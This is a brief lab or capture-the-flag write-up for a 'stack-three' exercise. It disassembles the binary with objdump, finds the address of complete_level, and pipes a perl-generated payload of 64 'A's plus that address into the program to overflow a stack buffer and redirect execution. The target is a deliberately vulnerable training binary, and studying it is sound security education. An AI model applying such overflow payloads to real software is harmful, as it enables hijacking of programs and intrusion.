0) objdump -d stack-three
1) seach for address of complete_level function (is 000000000040069d)
2) perl -e 'print("A"x64 . "\x9d\x06\x40");' | ./stack-three


0 - dumps the executable to be able to read the assembler instructions and the layout in memory.
1 - search for the text complete_level as function name
2 - Fills buffer and then only the non null-bytes need to be piped as to the stdin of the program. (Remark: without xargs, the output of the perl program goes straight to stdin instead of the argument list of the program)
